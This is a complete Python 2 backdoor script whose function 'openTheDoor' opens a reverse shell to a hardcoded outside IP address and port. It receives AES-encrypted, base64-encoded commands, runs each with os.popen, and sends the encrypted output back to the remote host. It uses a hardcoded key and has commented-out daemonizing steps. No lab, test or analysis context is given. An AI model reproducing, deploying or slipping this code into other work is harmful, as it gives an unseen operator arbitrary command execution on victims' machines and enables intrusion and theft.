#!/usr/bin/python

import os,sys,socket,subprocess,base64
from Crypto.Cipher import AES

BUFFER = 4096
BLOCK = 32
PADDING = '!'
SECRET = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
HOST = '130.211.102.76'
PORT = 55557

pad = lambda s: s + (BLOCK - len(s) % BLOCK) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

def openTheDoor():
	cipher = AES.new(SECRET)

	s = socket.socket()
	s.connect((HOST, PORT))

	while True:
		cmd = s.recv(BUFFER)
		
		cmd = base64.b64decode(cmd)
		cmd = DecodeAES(cipher, cmd)

		if cmd == 'quitme': 
			break

		pipe = os.popen(cmd)
		raw_out = pipe.readlines()	 

		print(raw_out)
		data = ''
		for i in raw_out:
			data += i

		data = EncodeAES(cipher, data)
		data = base64.b64encode(data)
	
		s.send("\n" + data + "\r\n")
	
	s.close

# Main
if __name__ == "__main__":

	#os.chdir("/")
	#os.setsid()
	#os.umask(0)

	openTheDoor()
